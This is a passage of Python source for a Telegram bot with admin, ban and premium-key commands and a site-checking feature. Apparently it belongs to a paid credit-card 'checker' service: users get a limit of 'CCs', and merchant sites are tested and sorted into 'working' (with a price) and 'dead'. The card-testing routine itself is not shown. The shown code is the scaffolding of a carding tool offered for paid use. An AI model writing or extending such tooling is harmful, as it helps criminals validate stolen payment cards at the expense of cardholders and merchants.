{SYMBOLS['bullet']} `/unauth UID` {SYMBOLS['arrow']} 𝐑𝐞𝐦𝐨𝐯𝐞 𝐩𝐫𝐞𝐦𝐢𝐮𝐦
{SYMBOLS['bullet']} `/ban UID` {SYMBOLS['arrow']} 𝐁𝐚𝐧 𝐮𝐬𝐞𝐫
{SYMBOLS['bullet']} `/unban UID` {SYMBOLS['arrow']} 𝐔𝐧𝐛𝐚𝐧 𝐮𝐬𝐞𝐫

{create_section('𝐊𝐄𝐘 𝐒𝐘𝐒𝐓𝐄𝐌', '🔑')}
{SYMBOLS['bullet']} `/key AMOUNT DAYS` {SYMBOLS['arrow']} 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐤𝐞𝐲𝐬

{create_section('𝐒𝐓𝐀𝐓𝐈𝐒𝐓𝐈𝐂𝐒', '📊')}
{SYMBOLS['bullet']} `/stats` {SYMBOLS['arrow']} 𝐁𝐨𝐭 𝐬𝐭𝐚𝐭𝐢𝐬𝐭𝐢𝐜𝐬

{create_footer()}"""
    await event.edit(text)

# ==================== COMMAND HANDLERS ====================

@client.on(events.NewMessage(pattern='/auth'))
async def auth_user(event):
    if event.sender_id not in ADMIN_ID: 
        return await event.reply("🚫 **𝐀𝐃𝐌𝐈𝐍 𝐎𝐍𝐋𝐘**")
    try:
        parts = event.raw_text.split()
        if len(parts) != 3: 
            return await event.reply(f"{create_header('𝐔𝐒𝐀𝐆𝐄', '📌')}\n/auth UID DAYS\n{create_footer()}")
        user_id = int(parts[1])
        days = int(parts[2])
        await add_premium_user(user_id, days)
        
        text = f"""{create_header('𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐀𝐃𝐃𝐄𝐃', '✅')}
{SYMBOLS['bullet']} 𝐔𝐈𝐃: `{user_id}`
{SYMBOLS['bullet']} 𝐃𝐚𝐲𝐬: `{days}`
{create_footer()}"""
        await event.reply(text)
        
        try: 
            user_text = f"""{create_header('𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃', '🎉')}
{SYMBOLS['bullet']} 𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐫𝐞𝐜𝐞𝐢𝐯𝐞𝐝 **{days}** 𝐝𝐚𝐲𝐬 𝐨𝐟 𝐩𝐫𝐞𝐦𝐢𝐮𝐦!
{create_footer()}"""
            await client.send_message(user_id, user_text)
        except: 
            pass
    except Exception as e: 
        await event.reply(f"❌ **𝐄𝐫𝐫𝐨𝐫:** `{e}`")

@client.on(events.NewMessage(pattern='/key'))
async def generate_keys(event):
    if event.sender_id not in ADMIN_ID: 
        return await event.reply("🚫 **𝐀𝐃𝐌𝐈𝐍 𝐎𝐍𝐋𝐘**")
    try:
        parts = event.raw_text.split()
        if len(parts) != 3: 
            return await event.reply(f"{create_header('𝐔𝐒𝐀𝐆𝐄', '📌')}\n/key AMOUNT DAYS\n{create_footer()}")
        amount = int(parts[1])
        days = int(parts[2])
        if amount > 10: 
            return await event.reply("❌ **𝐌𝐚𝐱 𝟏𝟎 𝐤𝐞𝐲𝐬**")
            
        keys_data = await load_json(KEYS_FILE)
        generated_keys = []
        for _ in range(amount):
            key = generate_key()
            keys_data[key] = {'days': days, 'created_at': datetime.datetime.now().isoformat(), 'used': False, 'used_by': None}
            generated_keys.append(key)
        await save_json(KEYS_FILE, keys_data)
        
        keys_text = "\n".join([f"{SYMBOLS['bullet']} `{key}`" for key in generated_keys])
        text = f"""{create_header('𝐊𝐄𝐘𝐒 𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄𝐃', '🔑')}
{SYMBOLS['bullet']} 𝐀𝐦𝐨𝐮𝐧𝐭: `{amount}`
{SYMBOLS['bullet']} 𝐃𝐚𝐲𝐬: `{days}`
{create_section('𝐊𝐄𝐘𝐒', '📋')}
{keys_text}
{create_footer()}"""
        await event.reply(text)
    except Exception as e: 
        await event.reply(f"❌ **𝐄𝐫𝐫𝐨𝐫:** `{e}`")

@client.on(events.NewMessage(pattern='/redeem'))
async def redeem_key(event):
    if await is_banned_user(event.sender_id): 
        return await event.reply(banned_user_message())
    try:
        parts = event.raw_text.split()
        if len(parts) != 2: 
            return await event.reply(f"{create_header('𝐔𝐒𝐀𝐆𝐄', '📌')}\n/redeem KEY\n{create_footer()}")
        key = parts[1].upper()
        keys_data = await load_json(KEYS_FILE)
        
        if key not in keys_data: 
            return await event.reply("❌ **𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐤𝐞𝐲**")
        if keys_data[key]['used']: 
            return await event.reply("❌ **𝐊𝐞𝐲 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐮𝐬𝐞𝐝**")
        if await is_premium_user(event.sender_id): 
            return await event.reply("❌ **𝐘𝐨𝐮 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐡𝐚𝐯𝐞 𝐩𝐫𝐞𝐦𝐢𝐮𝐦**")
            
        days = keys_data[key]['days']
        await add_premium_user(event.sender_id, days)
        keys_data[key]['used'] = True
        keys_data[key]['used_by'] = event.sender_id
        keys_data[key]['used_at'] = datetime.datetime.now().isoformat()
        await save_json(KEYS_FILE, keys_data)
        
        text = f"""{create_header('𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃', '🎉')}
{SYMBOLS['bullet']} 𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐫𝐞𝐜𝐞𝐢𝐯𝐞𝐝 **{days}** 𝐝𝐚𝐲𝐬 𝐨𝐟 𝐩𝐫𝐞𝐦𝐢𝐮𝐦!
{SYMBOLS['bullet']} 𝐄𝐧𝐣𝐨𝐲 𝐭𝐡𝐞 𝐛𝐞𝐧𝐞𝐟𝐢𝐭𝐬!
{create_footer()}"""
        await event.reply(text)
    except Exception as e: 
        await event.reply(f"❌ **𝐄𝐫𝐫𝐨𝐫:** `{e}`")

@client.on(events.NewMessage(pattern='/add'))
async def add_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    try:
        add_text = event.raw_text[4:].strip()
        if not add_text: 
            return await event.reply(f"{create_header('𝐔𝐒𝐀𝐆𝐄', '📌')}\n/add site.com\n{create_footer()}")
            
        sites_to_add = extract_urls_from_text(add_text)
        if not sites_to_add: 
            return await event.reply("❌ **𝐍𝐨 𝐯𝐚𝐥𝐢𝐝 𝐬𝐢𝐭𝐞𝐬**")
            
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        added_sites = []
        already_exists = []
        
        for site in sites_to_add:
            if site in user_sites: 
                already_exists.append(site)
            else:
                user_sites.append(site)
                added_sites.append(site)
                
        sites[str(event.sender_id)] = user_sites
        await save_json(SITE_FILE, sites)
        
        text = f"""{create_header('𝐒𝐈𝐓𝐄𝐒 𝐔𝐏𝐃𝐀𝐓𝐄𝐃', '✅')}"""
        
        if added_sites:
            text += f"\n\n{create_section('𝐀𝐃𝐃𝐄𝐃', '➕')}"
            for s in added_sites[:5]:
                text += f"\n{SYMBOLS['bullet']} `{s[:35]}...`" if len(s) > 35 else f"\n{SYMBOLS['bullet']} `{s}`"
            if len(added_sites) > 5:
                text += f"\n{SYMBOLS['bullet']} ... 𝐚𝐧𝐝 {len(added_sites)-5} 𝐦𝐨𝐫𝐞"
                
        if already_exists:
            text += f"\n\n{create_section('𝐀𝐋𝐑𝐄𝐀𝐃𝐘 𝐄𝐗𝐈𝐒𝐓', '⚠️')}"
            for s in already_exists[:5]:
                text += f"\n{SYMBOLS['bullet']} `{s[:35]}...`" if len(s) > 35 else f"\n{SYMBOLS['bullet']} `{s}`"
            if len(already_exists) > 5:
                text += f"\n{SYMBOLS['bullet']} ... 𝐚𝐧𝐝 {len(already_exists)-5} 𝐦𝐨𝐫𝐞"
                
        text += f"\n\n{SYMBOLS['bullet']} **𝐓𝐨𝐭𝐚𝐥:** `{len(user_sites)}` 𝐬𝐢𝐭𝐞𝐬\n{create_footer()}"
        await event.reply(text)
    except Exception as e: 
        await event.reply(f"❌ **𝐄𝐫𝐫𝐨𝐫:** `{e}`")

@client.on(events.NewMessage(pattern='/rm'))
async def remove_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    try:
        rm_text = event.raw_text[3:].strip()
        if not rm_text: 
            return await event.reply(f"{create_header('𝐔𝐒𝐀𝐆𝐄', '📌')}\n/rm site.com\n{create_footer()}")
            
        sites_to_remove = extract_urls_from_text(rm_text)
        if not sites_to_remove: 
            return await event.reply("❌ **𝐍𝐨 𝐯𝐚𝐥𝐢𝐝 𝐬𝐢𝐭𝐞𝐬**")
            
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        removed_sites = []
        not_found_sites = []
        
        for site in sites_to_remove:
            if site in user_sites:
                user_sites.remove(site)
                removed_sites.append(site)
            else: 
                not_found_sites.append(site)
                
        sites[str(event.sender_id)] = user_sites
        await save_json(SITE_FILE, sites)
        
        text = f"""{create_header('𝐒𝐈𝐓𝐄𝐒 𝐔𝐏𝐃𝐀𝐓𝐄𝐃', '✅')}"""
        
        if removed_sites:
            text += f"\n\n{create_section('𝐑𝐄𝐌𝐎𝐕𝐄𝐃', '➖')}"
            for s in removed_sites[:5]:
                text += f"\n{SYMBOLS['bullet']} `{s[:35]}...`" if len(s) > 35 else f"\n{SYMBOLS['bullet']} `{s}`"
            if len(removed_sites) > 5:
                text += f"\n{SYMBOLS['bullet']} ... 𝐚𝐧𝐝 {len(removed_sites)-5} 𝐦𝐨𝐫𝐞"
                
        if not_found_sites:
            text += f"\n\n{create_section('𝐍𝐎𝐓 𝐅𝐎𝐔𝐍𝐃', '❌')}"
            for s in not_found_sites[:5]:
                text += f"\n{SYMBOLS['bullet']} `{s[:35]}...`" if len(s) > 35 else f"\n{SYMBOLS['bullet']} `{s}`"
            if len(not_found_sites) > 5:
                text += f"\n{SYMBOLS['bullet']} ... 𝐚𝐧𝐝 {len(not_found_sites)-5} 𝐦𝐨𝐫𝐞"
                
        text += f"\n\n{SYMBOLS['bullet']} **𝐓𝐨𝐭𝐚𝐥:** `{len(user_sites)}` 𝐬𝐢𝐭𝐞𝐬\n{create_footer()}"
        await event.reply(text)
    except Exception as e: 
        await event.reply(f"❌ **𝐄𝐫𝐫𝐨𝐫:** `{e}`")

@client.on(events.NewMessage(pattern='/info'))
async def info(event):
    if await is_banned_user(event.sender_id): 
        return await event.reply(banned_user_message())
    
    user = await event.get_sender()
    user_id = event.sender_id
    first_name = user.first_name or "𝐍/𝐀"
    last_name = user.last_name or ""
    full_name = f"{first_name} {last_name}".strip()
    username = f"@{user.username}" if user.username else "𝐍/𝐀"
    has_premium = await is_premium_user(user_id)
    
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(user_id), [])
    
    if has_premium:
        premium_data = await load_json(PREMIUM_FILE)
        expiry = premium_data.get(str(user_id), {}).get('expiry', '𝐍/𝐀')
        if expiry != '𝐍/𝐀':
            expiry_date = datetime.datetime.fromisoformat(expiry)
            days_left = (expiry_date - datetime.datetime.now()).days
            premium_text = f"💎 {days_left} 𝐝𝐚𝐲𝐬"
        else:
            premium_text = "💎 𝐀𝐜𝐭𝐢𝐯𝐞"
    else:
        premium_text = "🆓 𝐅𝐫𝐞𝐞"
    
    text = f"""{create_header('𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍', '👤')}
{create_section('𝐏𝐄𝐑𝐒𝐎𝐍𝐀𝐋', '👤')}
{SYMBOLS['bullet']} 𝐍𝐚𝐦𝐞: **{full_name}**
{SYMBOLS['bullet']} 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: **{username}**
{SYMBOLS['bullet']} 𝐔𝐈𝐃: `{user_id}`

{create_section('𝐀𝐂𝐂𝐄𝐒𝐒', '🔑')}
{SYMBOLS['bullet']} 𝐒𝐭𝐚𝐭𝐮𝐬: {premium_text}
{SYMBOLS['bullet']} 𝐒𝐢𝐭𝐞𝐬: `{len(user_sites)}`
{SYMBOLS['bullet']} 𝐋𝐢𝐦𝐢𝐭: `{get_cc_limit('premium_private' if has_premium else 'group_free', user_id)}` 𝐂𝐂𝐬

{create_footer()}"""
    await event.reply(text)

@client.on(events.NewMessage(pattern='/stats'))
async def stats(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 **𝐀𝐃𝐌𝐈𝐍 𝐎𝐍𝐋𝐘**")

    try:
        premium_users = await load_json(PREMIUM_FILE)
        user_sites = await load_json(SITE_FILE)
        keys_data = await load_json(KEYS_FILE)
        
        total_premium = len(premium_users)
        total_users_with_sites = len(user_sites)
        total_sites = sum(len(sites) for sites in user_sites.values())
        total_keys = len(keys_data)
        used_keys = len([k for k, v in keys_data.items() if v.get('used', False)])
        
        # Calculate active premium users (not expired)
        active_premium = 0
        for uid, data in premium_users.items():
            expiry = datetime.datetime.fromisoformat(data['expiry'])
            if expiry > datetime.datetime.now():
                active_premium += 1
        
        text = f"""{create_header('𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐈𝐒𝐓𝐈𝐂𝐒', '📊')}
{SYMBOLS['box_v']} 📅 `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`

{create_section('𝐔𝐒𝐄𝐑 𝐒𝐓𝐀𝐓𝐒', '👥')}
{SYMBOLS['bullet']} 𝐏𝐫𝐞𝐦𝐢𝐮𝐦: `{total_premium}` (𝐀𝐜𝐭𝐢𝐯𝐞: `{active_premium}`)
{SYMBOLS['bullet']} 𝐖𝐢𝐭𝐡 𝐬𝐢𝐭𝐞𝐬: `{total_users_with_sites}`
{SYMBOLS['bullet']} 𝐓𝐨𝐭𝐚𝐥: `{total_users_with_sites + total_premium}`

{create_section('𝐒𝐈𝐓𝐄 𝐒𝐓𝐀𝐓𝐒', '🌐')}
{SYMBOLS['bullet']} 𝐓𝐨𝐭𝐚𝐥 𝐬𝐢𝐭𝐞𝐬: `{total_sites}`
{SYMBOLS['bullet']} 𝐀𝐯𝐠/𝐮𝐬𝐞𝐫: `{(total_sites/total_users_with_sites if total_users_with_sites else 0):.1f}`

{create_section('𝐊𝐄𝐘 𝐒𝐓𝐀𝐓𝐒', '🔑')}
{SYMBOLS['bullet']} 𝐓𝐨𝐭𝐚𝐥: `{total_keys}`
{SYMBOLS['bullet']} 𝐔𝐬𝐞𝐝: `{used_keys}`
{SYMBOLS['bullet']} 𝐔𝐧𝐮𝐬𝐞𝐝: `{total_keys - used_keys}`

{create_footer()}"""
        await event.reply(text)
    except Exception as e:
        await event.reply(f"❌ **𝐄𝐫𝐫𝐨𝐫:** `{e}`")

@client.on(events.NewMessage(pattern='/unauth'))
async def unauth_user(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 **𝐀𝐃𝐌𝐈𝐍 𝐎𝐍𝐋𝐘**")
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply(f"{create_header('𝐔𝐒𝐀𝐆𝐄', '📌')}\n/unauth UID\n{create_footer()}")
        user_id = int(parts[1])
        if not await is_premium_user(user_id):
            return await event.reply(f"❌ **𝐔𝐬𝐞𝐫 `{user_id}` 𝐧𝐨𝐭 𝐩𝐫𝐞𝐦𝐢𝐮𝐦**")
        success = await remove_premium_user(user_id)
        if success:
            text = f"""{create_header('𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐑𝐄𝐌𝐎𝐕𝐄𝐃', '⚠️')}
{SYMBOLS['bullet']} 𝐔𝐈𝐃: `{user_id}`
{create_footer()}"""
            await event.reply(text)
            try:
                user_text = f"""{create_header('𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐑𝐄𝐕𝐎𝐊𝐄𝐃', '⚠️')}
{SYMBOLS['bullet']} 𝐘𝐨𝐮𝐫 𝐩𝐫𝐞𝐦𝐢𝐮𝐦 𝐚𝐜𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐫𝐞𝐯𝐨𝐤𝐞𝐝.
{SYMBOLS['bullet']} 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 @DekuCHK 𝐟𝐨𝐫 𝐝𝐞𝐭𝐚𝐢𝐥𝐬.
{create_footer()}"""
                await client.send_message(user_id, user_text)
            except:
                pass
    except Exception as e:
        await event.reply(f"❌ **𝐄𝐫𝐫𝐨𝐫:** `{e}`")

@client.on(events.NewMessage(pattern='/ban'))
async def ban_user_command(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 **𝐀𝐃𝐌𝐈𝐍 𝐎𝐍𝐋𝐘**")
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply(f"{create_header('𝐔𝐒𝐀𝐆𝐄', '📌')}\n/ban UID\n{create_footer()}")
        user_id = int(parts[1])
        if await is_banned_user(user_id):
            return await event.reply(f"❌ **𝐔𝐬𝐞𝐫 `{user_id}` 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐛𝐚𝐧𝐧𝐞𝐝**")
        await remove_premium_user(user_id)
        await ban_user(user_id, event.sender_id)
        
        text = f"""{create_header('𝐔𝐒𝐄𝐑 𝐁𝐀𝐍𝐍𝐄𝐃', '🚫')}
{SYMBOLS['bullet']} 𝐔𝐈𝐃: `{user_id}`
{create_footer()}"""
        await event.reply(text)
        try:
            await client.send_message(user_id, banned_user_message())
        except:
            pass
    except Exception as e:
        await event.reply(f"❌ **𝐄𝐫𝐫𝐨𝐫:** `{e}`")

@client.on(events.NewMessage(pattern='/unban'))
async def unban_user_command(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 **𝐀𝐃𝐌𝐈𝐍 𝐎𝐍𝐋𝐘**")
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply(f"{create_header('𝐔𝐒𝐀𝐆𝐄', '📌')}\n/unban UID\n{create_footer()}")
        user_id = int(parts[1])
        if not await is_banned_user(user_id):
            return await event.reply(f"❌ **𝐔𝐬𝐞𝐫 `{user_id}` 𝐧𝐨𝐭 𝐛𝐚𝐧𝐧𝐞𝐝**")
        success = await unban_user(user_id)
        if success:
            text = f"""{create_header('𝐔𝐒𝐄𝐑 𝐔𝐍𝐁𝐀𝐍𝐍𝐄𝐃', '✅')}
{SYMBOLS['bullet']} 𝐔𝐈𝐃: `{user_id}`
{create_footer()}"""
            await event.reply(text)
            try:
                user_text = f"""{create_header('𝐀𝐂𝐂𝐄𝐒𝐒 𝐑𝐄𝐒𝐓𝐎𝐑𝐄𝐃', '🎉')}
{SYMBOLS['bullet']} 𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐮𝐧𝐛𝐚𝐧𝐧𝐞𝐝.
{SYMBOLS['bullet']} 𝐘𝐨𝐮 𝐜𝐚𝐧 𝐧𝐨𝐰 𝐮𝐬𝐞 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐚𝐠𝐚𝐢𝐧.
{create_footer()}"""
                await client.send_message(user_id, user_text)
            except:
                pass
    except Exception as e:
        await event.reply(f"❌ **𝐄𝐫𝐫𝐨𝐫:** `{e}`")

# ==================== SITE CHECK HANDLERS ====================

@client.on(events.NewMessage(pattern='/check'))
async def check_sites(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    if not can_access:
        msg, btn = access_denied_message_with_button()
        return await event.reply(msg, buttons=btn)

    check_text = event.raw_text[6:].strip()
    if not check_text:
        buttons = [[Button.inline("🔍 𝐂𝐇𝐄𝐂𝐊 𝐌𝐘 𝐒𝐈𝐓𝐄𝐒", b"check_db_sites")]]
        text = f"""{create_header('𝐒𝐈𝐓𝐄 𝐂𝐇𝐄𝐂𝐊𝐄𝐑', '🔍')}
{create_section('𝐌𝐀𝐍𝐔𝐀𝐋 𝐂𝐇𝐄𝐂𝐊', '📝')}
/check
1. site.com
2. example.com

{create_section('𝐐𝐔𝐈𝐂𝐊 𝐂𝐇𝐄𝐂𝐊', '⚡')}
𝐂𝐥𝐢𝐜𝐤 𝐭𝐡𝐞 𝐛𝐮𝐭𝐭𝐨𝐧 𝐛𝐞𝐥𝐨𝐰 𝐭𝐨 𝐜𝐡𝐞𝐜𝐤 𝐲𝐨𝐮𝐫 𝐃𝐁 𝐬𝐢𝐭𝐞𝐬
{create_footer()}"""
        return await event.reply(text, buttons=buttons)

    sites_to_check = extract_urls_from_text(check_text)
    if not sites_to_check:
        return await event.reply("❌ **𝐍𝐨 𝐯𝐚𝐥𝐢𝐝 𝐬𝐢𝐭𝐞𝐬**")
    
    asyncio.create_task(process_site_check(event, sites_to_check))

async def process_site_check(event, sites):
    total = len(sites)
    checked = 0
    working = []
    dead = []
    
    msg = await event.reply(f"""{create_header('𝐒𝐈𝐓𝐄 𝐂𝐇𝐄𝐂𝐊', '🔍')}
{progress_bar(0, total)} 0/{total}
{create_footer()}""")
    
    for site in sites:
        checked += 1
        result = await test_single_site(site)
        
        if result["status"] == "working":
            working.append(result)
        else:
            dead.append(result)
        
        try:
            status_text = f"""{create_header('𝐒𝐈𝐓𝐄 𝐂𝐇𝐄𝐂𝐊', '🔍')}
{create_section('𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒', '📊')}
{progress_bar(checked, total)}
{SYMBOLS['bullet']} ✅ 𝐖𝐨𝐫𝐤𝐢𝐧𝐠: `{len(working)}`
{SYMBOLS['bullet']} ❌ 𝐃𝐞𝐚𝐝: `{len(dead)}`

{create_section('𝐂𝐔𝐑𝐑𝐄𝐍𝐓', '🔄')}
{SYMBOLS['bullet']} 𝐒𝐢𝐭𝐞: `{site[:40]}...`
{SYMBOLS['bullet']} 𝐒𝐭𝐚𝐭𝐮𝐬: **{result['status'].upper()}**
{create_footer()}"""
            await msg.edit(status_text)
        except:
            pass
        await asyncio.sleep(0.5)
    
    text = f"""{create_header('𝐂𝐇𝐄𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄', '✅')}
{create_section('𝐑𝐄𝐒𝐔𝐋𝐓𝐒', '📊')}
{SYMBOLS['bullet']} ✅ 𝐖𝐨𝐫𝐤𝐢𝐧𝐠: `{len(working)}`
{SYMBOLS['bullet']} ❌ 𝐃𝐞𝐚𝐝: `{len(dead)}`
{SYMBOLS['bullet']} 📊 𝐓𝐨𝐭𝐚𝐥: `{total}`

{create_section('𝐖𝐎𝐑𝐊𝐈𝐍𝐆 𝐒𝐈𝐓𝐄𝐒', '✅')}"""
    
    if working:
        for idx, w in enumerate(working[:8], 1):
            text += f"\n{SYMBOLS['bullet']} `{w['site'][:35]}...` ({w['price']})" if len(w['site']) > 35 else f"\n{SYMBOLS['bullet']} `{w['site']}` ({w['price']})"
        if len(working) > 8:
            text += f"\n{SYMBOLS['bullet']} ... 𝐚𝐧𝐝 {len(working)-8} 𝐦𝐨𝐫𝐞"
    else:
        text += f"\n{SYMBOLS['bullet']} 𝐍𝐨 𝐰𝐨𝐫𝐤𝐢𝐧𝐠 𝐬𝐢𝐭𝐞𝐬"
    
    text += f"\n\n{create_section('𝐃𝐄𝐀𝐃 𝐒𝐈𝐓𝐄𝐒', '❌')}"
    
    if dead:
        for idx, d in enumerate(dead[:8], 1):
            text += f"\n{SYMBOLS['bullet']} `{d['site'][:35]}...`" if len(d['site']) > 35 else f"\n{SYMBOLS['bullet']} `{d['site']}`"
        if len(dead) > 8:
            text += f"\n{SYMBOLS['bullet']} ... 𝐚𝐧𝐝 {len(dead)-8} 𝐦𝐨𝐫𝐞"
    else:
        text += f"\n{SYMBOLS['bullet']} 𝐍𝐨 𝐝𝐞𝐚𝐝 𝐬𝐢𝐭𝐞𝐬"
    
    text += f"\n\n{create_footer()}"
    
    buttons = []
    if working:
        sites_data = "|".join([w['site'] for w in working])
        buttons.append([Button.inline("➕ 𝐀𝐃𝐃 𝐖𝐎𝐑𝐊𝐈𝐍𝐆 𝐒𝐈𝐓𝐄𝐒", f"add_working:{event.sender_id}:{sites_data}".encode())])
    
    await msg.edit(text, buttons=buttons if buttons else None)

@client.on(events.CallbackQuery(data=b"check_db_sites"))
async def check_db_sites_callback(event):
    user_id = event.sender_id
    sites_data = await load_json(SITE_FILE)
    user_sites = sites_data.get(str(user_id), [])
    
    if not user_sites:
        return await event.answer("❌ **𝐍𝐨 𝐬𝐢𝐭𝐞𝐬 𝐢𝐧 𝐃𝐁**", alert=True)
    
    await event.answer("🔍 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...", alert=False)
    asyncio.create_task(process_db_site_check(event, user_sites))

async def process_db_site_check(event, user_sites):
    user_id = event.sender_id
    total = len(user_sites)
    checked = 0
    working = []
    dead = []
    
    await event.edit(f"""{create_header('𝐃𝐁 𝐒𝐈𝐓𝐄 𝐂𝐇𝐄𝐂𝐊', '🔍')}
{progress_bar(0, total)} 0/{total}
{create_footer()}""")
    
    for site in user_sites:
        checked += 1
        result = await test_single_site(site)
        
        if result["status"] == "working":
            working.append(site)
        else:
            dead.append(site)
        
        try:
            status_text = f"""{create_header('𝐃𝐁 𝐒𝐈𝐓𝐄 𝐂𝐇𝐄𝐂𝐊', '🔍')}
{create_section('𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒', '📊')}
{progress_bar(checked, total)}
{SYMBOLS['bullet']} ✅ 𝐖𝐨𝐫𝐤𝐢𝐧𝐠: `{len(working)}`
{SYMBOLS['bullet']} ❌ 𝐃𝐞𝐚𝐝: `{len(dead)}`

{create_section('𝐂𝐔𝐑𝐑𝐄𝐍𝐓', '🔄')}
{SYMBOLS['bullet']} 𝐒𝐢𝐭𝐞: `{site[:40]}...`
{SYMBOLS['bullet']} 𝐒𝐭𝐚𝐭𝐮𝐬: **{result['status'].upper()}**
{create_footer()}"""
            await event.edit(status_text)
        except:
            pass
        await asyncio.sleep(0.5)
    
    if dead:
        sites_data = await load_json(SITE_FILE)
        sites_data[str(user_id)] = working
        await save_json(SITE_FILE, sites_data)
    
    text = f"""{create_header('𝐃𝐁 𝐂𝐇𝐄𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄', '✅')}
{create_section('𝐑𝐄𝐒𝐔𝐋𝐓𝐒', '📊')}
{SYMBOLS['bullet']} ✅ 𝐊𝐞𝐩𝐭: `{len(working)}`
{SYMBOLS['bullet']} ❌ 𝐑𝐞𝐦𝐨𝐯𝐞𝐝: `{len(dead)}`
{SYMBOLS['bullet']} 📊 𝐓𝐨𝐭𝐚𝐥: `{total}`

{create_section('𝐊𝐄𝐏𝐓 𝐒𝐈𝐓𝐄𝐒', '✅')}"""
    
    if working:
        for idx, w in enumerate(working[:8], 1):
            text += f"\n{SYMBOLS['bullet']} `{w[:35]}...`" if len(w) > 35 else f"\n{SYMBOLS['bullet']} `{w}`"
        if len(working) > 8:
            text += f"\n{SYMBOLS['bullet']} ... 𝐚𝐧𝐝 {len(working)-8} 𝐦𝐨𝐫𝐞"
    else:
        text += f"\n{SYMBOLS['bullet']} 𝐍𝐨 𝐬𝐢𝐭𝐞𝐬 𝐤𝐞𝐩𝐭"
    
    text += f"\n\n{create_section('𝐑𝐄𝐌𝐎𝐕𝐄𝐃 𝐒𝐈𝐓𝐄𝐒', '❌')}"
    
    if dead:
        for idx, d in enumerate(dead[:8], 1):
            text += f"\n{SYMBOLS['bullet']} `{d[:35]}...`" if len(d) > 35 else f"\n{SYMBOLS['bullet']} `{d}`"
        if len(dead) > 8:
            text += f"\n{SYMBOLS['bullet']} ... 𝐚𝐧𝐝 {len(dead)-8} 𝐦𝐨𝐫𝐞"
    else:
        text += f"\n{SYMBOLS['bullet']} 𝐍𝐨 𝐬𝐢𝐭𝐞𝐬 𝐫𝐞𝐦𝐨𝐯𝐞𝐝"
    
    text += f"\n\n{create_footer()}"
    await event.edit(text)

@client.on(events.CallbackQuery(pattern=rb"add_working:(\d+):(.+)"))
async def add_working_sites_callback(event):
    try:
        match = event.pattern_match
        callback_user_id = int(match.group(1).decode())
        working_sites_data = match.group(2).decode()
        working_sites = working_sites_data.split("|")
        
        if event.sender_id != callback_user_id:
            return await event.answer("❌ **𝐍𝐨𝐭 𝐲𝐨𝐮𝐫 𝐜𝐡𝐞𝐜𝐤**", alert=True)
        
        sites_data = await load_json(SITE_FILE)
        user_sites = sites_data.get(str(callback_user_id), [])
        
        added = []
        exists = []
        for site in working_sites:
            if site not in user_sites:
                user_sites.append(site)
                added.append(site)
            else:
                exists.append(site)
        
        sites_data[str(callback_user_id)] = user_sites
        await save_json(SITE_FILE, sites_data)
        
        text = f"""{create_header('𝐒𝐈𝐓𝐄𝐒 𝐀𝐃𝐃𝐄𝐃', '✅')}"""
        
        if added:
            text += f"\n\n{create_section('𝐍𝐄𝐖 𝐒𝐈𝐓𝐄𝐒', '➕')}"
            for a in added[:5]:
                text += f"\n{SYMBOLS['bullet']} `{a[:35]}...`" if len(a) > 35 else f"\n{SYMBOLS['bullet']} `{a}`"
            if len(added) > 5:
                text += f"\n{SYMBOLS['bullet']} ... 𝐚𝐧𝐝 {len(added)-5} 𝐦𝐨𝐫𝐞"
        
        if exists:
            text += f"\n\n{create_section('𝐀𝐋𝐑𝐄𝐀𝐃𝐘 𝐄𝐗𝐈𝐒𝐓', '⚠️')}"
            for e in exists[:5]:
                text += f"\n{SYMBOLS['bullet']} `{e[:35]}...`" if len(e) > 35 else f"\n{SYMBOLS['bullet']} `{e}`"
            if len(exists) > 5:
                text += f"\n{SYMBOLS['bullet']} ... 𝐚𝐧𝐝 {len(exists)-5} 𝐦𝐨𝐫𝐞"
        
